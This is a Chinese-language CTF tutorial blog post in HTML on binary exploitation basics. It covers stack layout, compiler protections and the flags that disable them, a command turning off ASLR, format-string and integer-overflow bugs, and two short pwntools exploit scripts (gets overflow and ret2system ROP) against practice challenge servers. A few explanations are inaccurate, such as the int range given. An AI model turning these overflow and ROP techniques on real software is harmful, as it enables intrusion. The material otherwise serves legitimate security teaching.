@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+
+  <meta name="description" content="pwn前置基础栈溢出及其返回地址（简略）栈顶：esp栈底：ebp 返回地址的地址位于 ebp，也就是栈底的地址加 4 个字节，假如 ebp 为 0xFF99C968, 那么返回地址就是 0XFF99C96C中间相差 4(或者 8 个字节) 个字节，同时要说一下地址的数字越大代表在栈堆中的位置越往下，也可以理解为返回地址在栈底下面 4（或者）个字节。 例如 0x00007FFCB22FC5A0，这就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn前置基础">
+<meta property="og:url" content="https://mark0519.github.io/2020/11/20/pwn%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="mark0519的博客">
+<meta property="og:description" content="pwn前置基础栈溢出及其返回地址（简略）栈顶：esp栈底：ebp 返回地址的地址位于 ebp，也就是栈底的地址加 4 个字节，假如 ebp 为 0xFF99C968, 那么返回地址就是 0XFF99C96C中间相差 4(或者 8 个字节) 个字节，同时要说一下地址的数字越大代表在栈堆中的位置越往下，也可以理解为返回地址在栈底下面 4（或者）个字节。 例如 0x00007FFCB22FC5A0，这就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc5388af322d8b11f5e0d805bd6d4f15fa204194.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200220154236609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc5388af322d8b11f5e0d805bd6d4f15fa204194.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/271531708ecc321881d650eb257bd94d1c0182e3.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ecac8c82456c2a22029b9f0ab6e0d02d321baf0e.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/9a99d96a8a2cc2c7956c2e9a0db9d6ecb68524c5.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d79f112e9cb25131aa3668c00fca31e6ec069f27.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/aec767cb09bcf2dc3943fb67e28e22d89e58c926.png">
+<meta property="article:published_time" content="2020-11-19T16:38:56.000Z">
+<meta property="article:modified_time" content="2020-11-19T16:39:41.171Z">
+<meta property="article:author" content="mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc5388af322d8b11f5e0d805bd6d4f15fa204194.png">
+
+
+<link rel="canonical" href="https://mark0519.github.io/2020/11/20/pwn%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn前置基础 | mark0519的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">mark0519的博客</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">pwn前置基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8A%E5%85%B6%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%EF%BC%88%E7%AE%80%E7%95%A5%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">栈溢出及其返回地址（简略）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec-%E6%8C%87%E4%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">checksec 指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4"><span class="nav-number">1.3.</span> <span class="nav-text">常见保护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Canary"><span class="nav-number">1.3.1.</span> <span class="nav-text">Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NX"><span class="nav-number">1.3.2.</span> <span class="nav-text">NX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE-ASLR"><span class="nav-number">1.3.3.</span> <span class="nav-text">PIE(ASLR)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RELRO"><span class="nav-number">1.3.4.</span> <span class="nav-text">RELRO</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.</span> <span class="nav-text">常见基础漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.1.</span> <span class="nav-text">格式化字符串漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.2.</span> <span class="nav-text">整数溢出漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gets-%E5%87%BD%E6%95%B0%E6%89%80%E4%BA%A7%E7%94%9F%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.3.</span> <span class="nav-text">gets 函数所产生的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP"><span class="nav-number">1.4.4.</span> <span class="nav-text">ROP</span></a></li></ol></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mark0519</p>
+  <div class="site-description" itemprop="description">我是mark0519，第一次玩博客的小萌新~</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2020/11/20/pwn%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mark0519">
+      <meta itemprop="description" content="我是mark0519，第一次玩博客的小萌新~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mark0519的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn前置基础
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-11-20 00:38:56 / 修改时间：00:39:41" itemprop="dateCreated datePublished" datetime="2020-11-20T00:38:56+08:00">2020-11-20</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="pwn前置基础"><a href="#pwn前置基础" class="headerlink" title="pwn前置基础"></a>pwn前置基础</h1><h2 id="栈溢出及其返回地址（简略）"><a href="#栈溢出及其返回地址（简略）" class="headerlink" title="栈溢出及其返回地址（简略）"></a>栈溢出及其返回地址（简略）</h2><p>栈顶：esp<br>栈底：ebp</p>
+<p>返回地址的地址位于 ebp，也就是栈底的地址加 4 个字节，假如 ebp 为 0xFF99C968, 那么返回地址就是 0XFF99C96C<br>中间相差 4(或者 8 个字节) 个字节，同时要说一下地址的数字越大代表在栈堆中的位置越往下，也可以理解为返回地址在栈底下面 4（或者）个字节。</p>
+<p>例如 0x00007FFCB22FC5A0，这就是 64 位的栈地址，而这时候函数的返回地址就是栈底的地址加 8，也就是 0x00007FFCB22FC5F8</p>
+<p>详细分析见我的内存模型和栈和堆的笔记</p>
+<h2 id="checksec-指令"><a href="#checksec-指令" class="headerlink" title="checksec 指令"></a>checksec 指令</h2><p>用来查询 pwn 题目的壳和保护，并且能够看到程序的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec (ELF文件名)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc5388af322d8b11f5e0d805bd6d4f15fa204194.png"></p>
+<h2 id="常见保护"><a href="#常见保护" class="headerlink" title="常见保护"></a>常见保护</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>stack canary表示栈的报警保护。在函数返回值之前添加的一串随机数（不超过机器字长），末位为/x00（提供了覆盖最后一字节输出泄露canary的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到canary处，就会改变原本该处的数值，当程序执行到此处时，会检查canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c &#x2F;&#x2F;禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
+
+<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。栈溢出的核心就是通过局部变量覆盖返回地址，然后加入shellcode，NX策略是使栈区域的代码无法执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c &#x2F;&#x2F; 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure>
+
+<h3 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE(ASLR)"></a>PIE(ASLR)</h3><p>内存地址随机化机制（address space layout randomization)，有以下三种情况<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加栈（heap）的随机化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c &#x2F;&#x2F; 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>
+
+<p>关闭 PIE</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>Partial RELRO：GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。</p>
+<p>Full RELRO：使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c &#x2F;&#x2F; 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c &#x2F;&#x2F; 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c &#x2F;&#x2F; 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="常见基础漏洞"><a href="#常见基础漏洞" class="headerlink" title="常见基础漏洞"></a>常见基础漏洞</h2><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>主要这个开启了 canary，就不能直接利用栈溢出覆盖返回地址了<br>所以可以通过格式化字符串漏洞泄露 canary 的值，然后再进行栈溢出的覆盖</p>
+<p>格式化字符串漏洞是因为 printf 的输出完全由用户控制<br>一个是通过 %p（将参数以十六进制方式打印）来实现任意内存泄露<br>64 位前六个参数位于寄存器，第多少个 %p 是目的内存则可以通过栈帧进行计算，八位（0x8）为一个 %p<br>再就是通过 %n（把输出字符的个数写入到地址中）来实现任意内存写入</p>
+<p>栈溢出需要注意的则是由于开启了 CANNARY，覆盖是需要注意把 canary 用原值覆盖</p>
+<p>在使用输出功能时，例如使用 printf() 函数时<br>使用了如下的代码，<br>printf(&amp;s)，<br>当然这是种错误的写法<br>正确的写法是<br>printf(“%s”,s)<br>但是错误的写法可以运行么，答案是可以的。</p>
+<h3 id="整数溢出漏洞"><a href="#整数溢出漏洞" class="headerlink" title="整数溢出漏洞"></a>整数溢出漏洞</h3><p>先贴一下 ctf 手册里面的定义。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200220154236609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>整数溢出的原理<br>假定一个整数，为 int 类型，我们要知道他的取值范围在 0-65535 之间<br>那么如果如果我们赋值给 var1=0,var2=65536, 那么在条件判断语句 if(var1==var2) 之下，他们两个是相等的，同理可得 var1=1=var2=65537。<br>这题我们就根据这样的原理来作答。</p>
+<h3 id="gets-函数所产生的漏洞"><a href="#gets-函数所产生的漏洞" class="headerlink" title="gets 函数所产生的漏洞"></a>gets 函数所产生的漏洞</h3><p>gets 函数不会限制输入的字符个数，所以会产生栈溢出漏洞</p>
+<p>这里举个攻防世界的例子：<br>when_did_you_born</p>
+<p>例如下图所示，我们就可以看到这个程序打开了 NX 保护和 Canary 保护，同时知道了它是一个 64 位的程序</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc5388af322d8b11f5e0d805bd6d4f15fa204194.png" alt="img"></p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/271531708ecc321881d650eb257bd94d1c0182e3.png"></p>
+<p>可以看到gets（）函数不限制输入字符串的长度</p>
+<p>故构造exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">c=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">35638</span>)</span><br><span class="line">c.recvuntil(<span class="string">&quot;What&#x27;s Your Birth?&quot;</span>)</span><br><span class="line">c.sendline(<span class="string">&quot;1999&quot;</span>)</span><br><span class="line">c.recvuntil(<span class="string">&quot;What&#x27;s Your Name?&quot;</span>)</span><br><span class="line">p=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span><span class="number">-0x18</span>)+p64(<span class="number">1926</span>)       <span class="comment">#gets()的栈溢出</span></span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>返回导向编程技术（Return-Oriented Programming，ROP）。所谓ROP，简单的说就是把原来已经存在的代码块拼接起来，拼接的方式是通过一个预先准备好的特殊的返回栈，里面包含了各条指令结束后下一条指令的地址。</p>
+<p>同样使用攻防世界的题目举例：</p>
+<p>file命令查看elf为32位的程序，拖到IDA打开</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ecac8c82456c2a22029b9f0ab6e0d02d321baf0e.png"></p>
+<p>发现system函数和vulnerable_function()函数</p>
+<p>进入vulnerable_function()函数：</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/9a99d96a8a2cc2c7956c2e9a0db9d6ecb68524c5.png"></p>
+<p>注意到数组buf长度为0x88，而read函数允许读入长度为0x100，存在明显栈溢出漏洞</p>
+<p>且查找发现有字符串：\bin\sh</p>
+<p>故查找system函数\bin\sh的地址，构造exp</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d79f112e9cb25131aa3668c00fca31e6ec069f27.png"></p>
+<p>system地址：0x08048320</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/aec767cb09bcf2dc3943fb67e28e22d89e58c926.png"></p>
+<p>\bin\sh地址：0x0804A024</p>
+<p><strong>注意：程序为32位，ebp地址为4个字符</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">c=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">34222</span>)</span><br><span class="line">c.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">p=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x08048320</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804A024</span>)  <span class="comment">#两个‘a’*4为覆盖他们栈帧的ebp</span></span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>mark0519
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://mark0519.github.io/2020/11/20/pwn%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/" title="pwn前置基础">https://mark0519.github.io/2020/11/20/pwn前置基础/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/11/19/pwn-ROP%E9%9D%A2%E5%90%91%E8%BF%94%E5%9B%9E%E7%9A%84%E7%BC%96%E7%A8%8B/" rel="prev" title="pwn_简单的ROP面向返回的编程">
+                  <i class="fa fa-chevron-left"></i> pwn_简单的ROP面向返回的编程
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mark0519</span>
+</div> <!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div> -->
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
